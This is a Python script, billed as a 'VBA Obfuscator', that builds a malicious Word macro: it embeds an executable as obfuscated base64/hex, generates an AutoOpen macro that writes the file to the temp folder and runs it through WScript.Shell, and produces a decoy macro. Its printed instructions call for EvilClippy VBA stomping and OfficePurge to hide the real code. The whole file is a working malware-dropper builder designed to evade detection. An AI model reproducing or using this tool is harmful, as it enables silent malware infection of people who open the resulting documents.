#!/usr/bin/env python3

import argparse
import signal
import base64
import random
import string
import sys

import time

from more_itertools import sliced

# Todo: DLL, PS1
FILE_TYPES = ("exe",)

# CTRL + C
def handler(sig, frame):
    print("\n\n[!] Saliendo...\n\n")
    sys.exit(-1)
signal.signal(signal.SIGINT, handler)

# Generate random name
def generateRandomName(_min, _max) -> str:
    res = [random.choice(string.ascii_letters)]
    length = random.randint(_min, _max)
    res.extend(random.choices(string.ascii_letters + string.digits + "_", k=length))
    return "".join(res)

# Generate dict with replace chars
def generateRandomReplace() -> dict:
    res = {}
    chars = string.punctuation.replace("\\", "").replace('"', "").replace("`", "")\
                              .replace("=", "").replace("+", "").replace("/", "")

    for i in random.choices(string.ascii_letters + string.digits + "/+=", k=len(chars)):
        char = random.choice(chars)
        res[i] = char
        chars = chars.replace(char, "")

    return res

class VBA:
    def __init__(self, b64_data, var_names, replace_dict, file_type):
        if file_type not in FILE_TYPES:
            raise NotImplementedError(f"Still no support for {file_type}")

        self.vba_code = ""

        self.b64_data = b64_data
        self.var_names = var_names
        self.replace_dict = replace_dict
        self.file_type = file_type

        self.func_deobfus = generateRandomName(random.randint(2, 5), random.randint(5, 13))
        self.func_b64decode = generateRandomName(random.randint(2, 5), random.randint(5, 13))
        self.func_hex2bytes = generateRandomName(random.randint(2, 5), random.randint(5, 13))
        self.func_main = generateRandomName(random.randint(2, 5), random.randint(5, 13))
        self.var_final = generateRandomName(random.randint(2, 5), random.randint(5, 13))
        self.var_b64 = generateRandomName(random.randint(2, 5), random.randint(5, 13))
        self.var_b64decoded = generateRandomName(random.randint(2, 5), random.randint(5,13))
        self.var_stream = generateRandomName(random.randint(2, 5), random.randint(5, 13))
        self.var_exe = generateRandomName(14, 16)

    # Obfuscate base64 data using replace_dict
    def obfuscate(self) -> str:
        temp_b64_data = self.b64_data

        for key, val in self.replace_dict.items():
            temp_b64_data = temp_b64_data.replace(key, val)

        return temp_b64_data

    # Split base64 data into the same elemets of the var_names variable
    def splitData(self, obf_b64) -> list:
        splited_data = []
        n = int(len(obf_b64)/len(self.var_names)) 
        while obf_b64:
            if len(splited_data) == len(self.var_names) - 1:
                splited_data.append(obf_b64)
                break

            splited_data.append(obf_b64[:n])
            obf_b64 = obf_b64[n:]

        return splited_data

    # Generate VBA code for exe files
    def vbaCodeForExe(self) -> str:
        vba_code = f"\tDim {self.var_stream}, {self.var_exe}\n"
        vba_code += f'\tSet {self.var_stream} = CreateObject(StrReverse("maertS.BDODA"))\n'
        vba_code += f'\t{self.var_exe} = Environ(StrReverse("PMET")) & "\\\\" & StrReverse("{self.var_exe[::-1]}") & StrReverse("exe.")\n'
        vba_code += f"\t{self.var_stream}.Type = 1\n"
        vba_code += f"\t{self.var_stream}.Open\n"
        vba_code += f"\t{self.var_stream}.Write({self.var_b64decoded})\n"
        vba_code += f"\t{self.var_stream}.SaveToFile {self.var_exe}, 2\n"
        vba_code += f"\t{self.var_stream}.Close\n"
        vba_code += f'\tCreateObject(StrReverse("llehS.tpircSW")).Exec({self.var_exe})\n'

        return vba_code

    # Generate VBA Code
    def generateVBA(self, fake=False) -> str:
        # Replace function
        if not fake:
            self.vba_code = ""
            self.vba_code += f"Private Function {self.func_deobfus}(h)\n"
            self.vba_code += "\tOn Error Resume Next\n"
            self.vba_code += "\n".join(f'\th = Replace(h, "{val}", "{key}")' for key, val in self.replace_dict.items())
            self.vba_code += f"\n\t{self.func_deobfus} = h\n"
            self.vba_code += "End Function\n"
        else:
            self.vba_code = ""
            self.vba_code += f"Private Function {self.func_deobfus}(h)\n"
            self.vba_code += "\tOn Error Resume Next\n"
            self.vba_code += "\n".join(f'\th = Replace(h, "{generateRandomName(1, 1)}", "{generateRandomName(1, 1)}")' for _ in self.replace_dict)
            self.vba_code += f"\n\t{self.func_deobfus} = h\n"
            self.vba_code += "End Function\n"

        # Base64 decode funtion
        if not fake:
            self.vba_code += f"Private Function {self.func_b64decode}(b)\n"
            self.vba_code += "\tDim x\n"
            self.vba_code += '\tWith CreateObject("Microsoft.XMLDOM").createElement(StrReverse("46b"))\n'
            self.vba_code += '\t\t.DataType = StrReverse("46esab.nib"): .Text = b\n'
            self.vba_code += '\t\tx = .nodeTypedValue\n'
            self.vba_code += '\t\tWith CreateObject("ADODB.Stream")\n'
            self.vba_code += '\t\t\t.Open: .Type = 1: .Write x: .Position = 0: .Type = 2: .Charset = "utf-8"\n'
            self.vba_code += f"\t\t\t{self.func_b64decode} = .ReadText\n"
            self.vba_code += "\t\t\t.Close\n"
            self.vba_code += "\t\tEnd With\n"
            self.vba_code += "\tEnd With\n"
            self.vba_code += "End Function\n"
        else:
            self.vba_code += f"Private Function {self.func_b64decode}(b)\n"
            self.vba_code += "\n".join(f'\tDim {generateRandomName(random.randint(13, 14), random.randint(18, 20))}' for _ in range(random.randint(10, 15)))
            self.vba_code += f'\n\t{self.func_b64decode} = "{generateRandomName(8,9)}"\n'
            self.vba_code += "End Function\n"

        # Hex string to Bytes
        if not fake:
            self.vba_code += f"Private Function {self.func_hex2bytes}(h)\n"
            self.vba_code += "\tOn Error Resume Next\n"
            self.vba_code += "\tDim x, e\n"
            self.vba_code += '\tSet x = CreateObject("Microsoft.XMLDOM")\n'
            self.vba_code += '\tSet e = x.createElement("element")\n'
            self.vba_code += '\te.DataType = "bin.hex"\n'
            self.vba_code += '\te.Text = h\n'
            self.vba_code += f"\t{self.func_hex2bytes} = e.NodeTypedValue\n"
            self.vba_code += "End Function\n"
        else:
            self.vba_code += f"Private Function {self.func_hex2bytes}(h)\n"
            self.vba_code += "\n".join(f'\tDim {generateRandomName(random.randint(13, 14), random.randint(18, 20))}' for _ in range(random.randint(10, 15)))
            self.vba_code += f'\n\t{self.func_hex2bytes} = "{generateRandomName(13, 14)}"\n'
            self.vba_code += "End Function\n"

        self.vba_code += "\n" * random.randint(2, 15)

        if not fake:
            temp_b64_data = self.obfuscate()
            splited_data = self.splitData(temp_b64_data)
        else:
            x = len(self.var_names)
            n = int(len(self.b64_data) / x)
            splited_data = [generateRandomName(n-1, n) for _ in range(0, x)]

        # Build all base64 functions
        for i, var in enumerate(self.var_names):
            lines = list(sliced(splited_data[i], random.randint(100,150)))
            self.vba_code += f"Function {var}() As String\n"
            self.vba_code += "\n".join([f'\t{var} = {var} & "{l}"' for l in lines])
            self.vba_code += f"\nEnd Function\n"
        
        if self.file_type == "dll":
            if not fake:
                pass
            else:
                pass

        # Main function
        self.vba_code += f"Private Sub {self.func_main}()\n"
        self.vba_code += f"\tDim {self.var_final} As String\n"
        self.vba_code += "\n".join(f"\t{self.var_final} = {self.var_final} & {x}()" for x in self.var_names)
        self.vba_code += f"\n\tDim {self.var_b64} As String\n"

        if not fake:
            self.vba_code += f"\tDim {self.var_b64decoded}() As byte\n"
        else:
            self.vba_code += f"\tDim {self.var_b64decoded}() As String\n"
        
        self.vba_code += f"\t{self.var_b64} = {self.func_deobfus}({self.var_final})\n"
        self.vba_code += f"\t{self.var_b64decoded} = {self.func_hex2bytes}({self.func_b64decode}({self.var_b64}))\n" 

        if self.file_type == "exe":
            if not fake:
                self.vba_code += self.vbaCodeForExe()
            else:
                self.vba_code += "\n".join(f'\tDim {generateRandomName(random.randint(13, 14), random.randint(18, 20))}' for _ in range(random.randint(10, 15)))
                self.vba_code += "\n"
        elif self.file_type == "ps1":
            if not fake:
                pass
            else:
                pass
        elif self.file_type == "dll":
            if not fake:
                pass
            else:
                pass

        self.vba_code += "End Sub\n"

        # AutoOpen function
        self.vba_code += "Sub AutoOpen()\n"
        self.vba_code += f"\t{self.func_main}\n"
        self.vba_code += "End Sub"

        return self.vba_code

def main(args):
    with open(args.file, "rb") as f:
        data = f.read()

    data = data.hex().encode("utf-8")
    b64_data = base64.b64encode(data).decode("ASCII")
    var_names = [generateRandomName(random.randint(2,4), random.randint(5, 7)) for _ in range(0, random.randint(10, 15))]
    replace_dict = generateRandomReplace() 

    vba = VBA(b64_data, var_names, replace_dict, args.type)
    vba_code = vba.generateVBA()
    fake_vba_code = vba.generateVBA(fake=True)
    
    #print(vba_code)
    #print(fake_vba_code)

    with open("final.vba", "w") as f:
        f.write(vba_code)

    with open("fake.vba", "w") as f:
        f.write(fake_vba_code)

    print("[+] Generated final.vba and fake.vba")
    print("[+] Please, copy fake.vba into a macro")
    print("[+] Use EvilClippy for stomp final.vba (EvilClippy.exe -s final.vba Doc1.doc)")
    print("[+] Use OfficePurge for purgue the macro (OfficePurge.exe -d word -f Doc1_EvilClippy.doc -m ThisDocument)")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='VBA Obfuscator')
    parser.add_argument("-f", "--file", required=True, type=str, help="File to be embedded")
    parser.add_argument(
        "-t", "--type",
        required=True, type=str,
        choices=FILE_TYPES, help="File type"
    )
    args = parser.parse_args()

    main(args)